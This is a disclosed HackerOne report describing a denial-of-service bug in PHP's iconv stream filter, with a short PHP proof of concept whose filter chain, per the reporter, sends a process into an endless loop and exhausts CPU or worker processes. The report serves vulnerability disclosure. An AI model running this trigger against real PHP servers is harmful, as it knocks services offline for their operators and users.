# DOS in stream filters

## Report Details
- **Report ID**: 505278
- **URL**: https://hackerone.com/reports/505278
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-03-05T16:55:38.672Z
- **Disclosed**: 2020-10-12T07:22:24.989Z

## Reporter
- **Username**: meitis
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
see bug report
https://bugs.php.net/bug.php?id=76249

as simple as
<?php
$fh = fopen('php://memory', 'rw');
fwrite($fh, "abc");
rewind($fh);
stream_filter_append($fh, 'convert.iconv.iso-10646/utf8//IGNORE', STREAM_FILTER_READ, []);
echo stream_get_contents($fh);

=> one process running in an endless loop

## Impact

DOS, process ends up in an endless loop, CPU (or available php processes or both) of affected system get easily exhausted

## Attachments
No attachments
